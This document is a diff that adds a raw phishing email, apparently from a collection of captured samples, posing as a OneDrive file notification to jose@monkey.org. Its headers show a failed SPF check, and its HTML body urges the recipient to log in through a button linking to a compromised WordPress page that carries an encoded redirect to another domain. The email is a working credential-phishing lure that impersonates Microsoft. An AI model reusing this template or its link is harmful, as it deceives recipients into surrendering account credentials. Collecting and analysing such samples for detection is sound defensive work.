@@ -1,0 +1,248 @@
+From jose@monkey.org Wed Oct 25 12:42:02 2023 +0000
+Return-Path: verifiedpaymey@urbancom.net
+Delivered-To: jose@monkey.org
+X-FDA: 81383946084.26.221D028
+Received: from urbancom.net (50-197-33-230-static.hfc.comcastbusiness.net [50.197.33.230])
+	by imf02.b.hostedemail.com (Postfix) with ESMTP id 4812A1A000C
+	for <jose@monkey.org>; Wed, 25 Oct 2023 12:42:01 +0000 (UTC)
+Authentication-Results: imf02.b.hostedemail.com;
+	dkim=none;
+	spf=fail (imf02.b.hostedemail.com: domain of verifiedpaymey@urbancom.net does not designate 50.197.33.230 as permitted sender) smtp.mailfrom=verifiedpaymey@urbancom.net;
+	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1698237721;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references; bh=41yhDUNvxZXr0mlx1mwEb/OERkCLZGEhmlJg/Ez6SL8=;
+	b=RW/iSHDaxrGVinCqyIOxThyHgSxpG3EHJ784hbxP8wYfEin5A8evBPmnS3gxNHkpcpb8Hb
+	LITfDVbPMLFac88tLEqsJ5iKtSNCxSh3HABakjrny1KwQJ/hw7uX6pfDnNa33x3llqn/+w
+	+jThwQgQcG14OALj5lnRLZ+752ZvaG0=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1698237721; a=rsa-sha256;
+	cv=none;
+	b=btBodYrqrVejmNkShKWPp7LFuDZDusEKJeenQT3PwILx2snVU5BIHt4YK5A0qE25O+zeYD
+	JpOTWLgbWdCgA1rmUZY5efuUTRfRwQPgUm2X6v8S42Yo6oW0OvclSAooy2BnCfUNc90Fgr
+	QtRbKSlME72WbQm09Xjr9SkipUjbzew=
+ARC-Authentication-Results: i=1;
+	imf02.b.hostedemail.com;
+	dkim=none;
+	spf=fail (imf02.b.hostedemail.com: domain of verifiedpaymey@urbancom.net does not designate 50.197.33.230 as permitted sender) smtp.mailfrom=verifiedpaymey@urbancom.net;
+	dmarc=none
+From: OneDrive<verifiedpaymey@urbancom.net>
+To: jose@monkey.org
+Subject: You Just Received A New File
+Date: 25 Oct 2023 08:42:00 -0400
+Message-ID: <20231025084200.A0BCAF2E7B185E36@urbancom.net>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam12
+X-Rspam-User: 
+X-Spam-Status: No, score=6.60
+X-Stat-Signature: d9ko7chy8xprgsw5yw8ndprmy8dypw4k
+X-Rspamd-Queue-Id: 4812A1A000C
+X-HE-Tag: 1698237721-292492
+X-HE-Meta: U2FsdGVkX1/faGahss6BuTBRAMSg9ob0iGBBJXmacuEj4pwFo5d0mk+u6oDunjd2JjmQw8DDDo7o+BTndqse0CI20t+ULF6zsPNYQR/I3XQedrJCyRaWXj2ddxWsFhcIh1QwMg5+AgBGn/EucqnUQ4OI1LKL0Nf4/xKzPlTPnwo0R4ma8Dy8B6WFuw6JJ8KKyVxGj4GRkhkSrN003JpIOk922oJeQpU+fycGkHyvX4A=
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 337
+
+<!DOCTYPE html>
+
+<HTML><HEAD><TITLE></TITLE>
+<META name=3DGENERATOR content=3D"MSHTML 10.00.9200.17609"></HEAD>
+<body>
+<table style=3D"FONT-SIZE: 15px; MAX-WIDTH: 720px; BORDER-TOP: rgb(247,248,=
+248) 1px solid; FONT-FAMILY: 'Segoe UI', 'Segoe UI Web (West European)', 'S=
+egoe UI', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', sans=
+-serif; BORDER-RIGHT: rgb(247,248,248) 1px solid; WHITE-SPACE: normal; BORD=
+ER-BOTTOM: rgb(247,248,248) 1px solid; TEXT-TRANSFORM: none; WORD-SPACING: =
+0px; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE: normal; MARGIN: 0p=
+x auto; BORDER-LEFT: rgb(247,248,248) 1px solid;=20
+ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; WIDTH: 720px; TEXT-INDENT: 0=
+px; font-variant-ligatures: normal; font-variant-caps: normal; font-variant=
+-numeric: inherit; font-variant-east-asian: inherit; font-stretch: inherit;=
+ -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decor=
+ation-color: initial" cellspacing=3D"0" cellpadding=3D"0" align=3D"center">=
+
+<TBODY>
+<TR>
+<td style=3D"WHITE-SPACE: normal !important; PADDING-BOTTOM: 10px; PADDING-=
+TOP: 20px; PADDING-LEFT: 25px; PADDING-RIGHT: 25px" align=3D"left">
+<img style=3D"WIDTH: 232px" src=3D"data:image/png;base64,iVBORw0KGgoAAAANSU=
+hEUgAAAUcAAACaCAMAAAANQHocAAAA8FBMVEX///8JSrL///3//v8JSbMAN6fc5vD///v//v0AQ=
+bAARbEAPawJSrAARa8JSrOKp9ZdgcT4/f/R4PE0Y7gAQ7GlvOTK1uiRp9JafsQAPq8AQasAR7PM=
+3OwARa1+ms////hBare6yeDk7foATK7r8/e+z+rp9P0AQ6bv+/0PT7CuxOZQebp3ls0APbKlvd4=
+AP6aVsdpKcr5ph8CCnMs2YL0pW7Ksv+rg8PcgVrB/m9Ntisuyy+dFcMDV6PadvN97mskAJ5wSTK=
+Vhgr4yYK/P3/dDcLQUUahTfctYhM6Xr9w9arNykMKswumwzvBgkdDR4Ou0+QUzAAAWj0lEQVR4n=
+O1di1/iONduQyBpmxZaCtKGeqFclbvLKzPozo6Ou6/Ofu/8///Nd04LAsptdlAW5fmNI0Jp2qcn=
+55aTR
+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"></TD></TR=
+>
+<TR>
+<td style=3D"WHITE-SPACE: normal !important">
+<table cellspacing=3D"0" cellpadding=3D"0" width=3D"100%">
+<TBODY>
+<TR>
+<td style=3D"FONT-SIZE: 20px; FONT-FAMILY: 'Atlas Grotesk', 'Open Sans', He=
+lveticaNeue-Light, 'Helvetica Neue Light', 'Helvetica Neue', Helvetica, Ari=
+al, 'Lucida Grande', sans-serif; WHITE-SPACE: normal !important; FONT-WEIGH=
+T: 300; COLOR: rgb(0,0,0); PADDING-BOTTOM: 15px; PADDING-TOP: 15px; PADDING=
+-LEFT: 0px; LINE-HEIGHT: 1.45em; PADDING-RIGHT: 0px; WIDTH: 720px">
+<table style=3D"MAX-WIDTH: 720px" cellspacing=3D"0" cellpadding=3D"0" width=
+=3D"100%">
+<TBODY>
+<TR>
+<td style=3D"FONT-SIZE: 32px; FONT-FAMILY: 'Atlas Grotesk', 'Open Sans', He=
+lveticaNeue-Light, 'Helvetica Neue Light', 'Helvetica Neue', Helvetica, Ari=
+al, 'Lucida Grande', sans-serif; WHITE-SPACE: normal !important; FONT-WEIGH=
+T: 500; COLOR: rgb(0,0,0); PADDING-BOTTOM: 15px; PADDING-TOP: 15px; PADDING=
+-LEFT: 25px; LINE-HEIGHT: 1.1em; PADDING-RIGHT: 25px; WIDTH: 550px"><STRONG=
+>You just received a new file in your OneDrive</STRONG></TD></TR>
+<TR>
+<td style=3D"FONT-SIZE: 20px; FONT-FAMILY: 'Atlas Grotesk', 'Open Sans', He=
+lveticaNeue-Light, 'Helvetica Neue Light', 'Helvetica Neue', Helvetica, Ari=
+al, 'Lucida Grande', sans-serif; WHITE-SPACE: normal !important; FONT-WEIGH=
+T: 300; COLOR: rgb(0,0,0); PADDING-BOTTOM: 15px; PADDING-TOP: 15px; PADDING=
+-LEFT: 25px; LINE-HEIGHT: 1.45em; PADDING-RIGHT: 25px; WIDTH: 550px">You ju=
+st received a new file from one of your members on OneDrive, login to view =
+now.<BR></TD></TR>
+<TR>
+<td style=3D"WHITE-SPACE: normal !important; PADDING-BOTTOM: 20px; PADDING-=
+TOP: 15px; PADDING-LEFT: 25px; PADDING-RIGHT: 25px; WIDTH: 500px" align=3D"=
+left">
+<table style=3D"MAX-WIDTH: 500px" cellspacing=3D"0" cellpadding=3D"0">
+<TBODY>
+<TR>
+<td style=3D"MAX-WIDTH: 500px; WHITE-SPACE: normal !important; PADDING-BOTT=
+OM: 11px; TEXT-ALIGN: center; PADDING-TOP: 11px; PADDING-LEFT: 50px; PADDIN=
+G-RIGHT: 50px; BACKGROUND-COLOR: rgb(0,97,255)">
+<A class=3Dx_external-tracking style=3D"FONT-SIZE: 18px; MAX-WIDTH: 500px; =
+BORDER-TOP: rgb(0,97,255) 0px solid; FONT-FAMILY: 'Atlas Grotesk', 'Open Sa=
+ns', HelveticaNeue-Light, 'Helvetica Neue Light', 'Helvetica Neue', Helveti=
+ca, Arial, 'Lucida Grande', sans-serif; BORDER-RIGHT: rgb(0,97,255) 0px sol=
+id; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: rgb(0,97,255) 0px solid; FONT-=
+WEIGHT: 300; COLOR: rgb(255,255,255); PADDING-BOTTOM: 0px; TEXT-ALIGN: cent=
+er; PADDING-TOP: 0px; PADDING-LEFT: 0px;=20
+TEXT-DECORATION: none; MARGIN: 0px; BORDER-LEFT: rgb(0,97,255) 0px solid; D=
+ISPLAY: block; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(0,97,255); font-st=
+retch: inherit; border-radius: 0px" href=3D"http://biaji.net//wp-content/ca=
+ptcha-verifying.html?server=3DaHR0cHM6Ly9kaWVrdWlpZWEuY29t&amp;key=3D1a86bc=
+26f266a904e682fd0ac9212e9c&amp;redirect=3Dhttps://www.google.com/" data-aut=
+h=3D"NotApplicable">
+Access your OneDrive<SPAN class=3Dmarkks2vp9v3a style=3D"BORDER-LEFT-WIDTH:=
+ 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDT=
+H: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; =
+MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px" data-ogsc=3D"" data=
+-ogsb=3D"" data-ogac=3D"" data-ogab=3D"" data-markjs=3D"true">&nbsp;files n=
+ow<BR></SPAN></A></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD><=
+/TR></TBODY></TABLE></TD></TR></TBODY></TABLE></BODY></HTML>
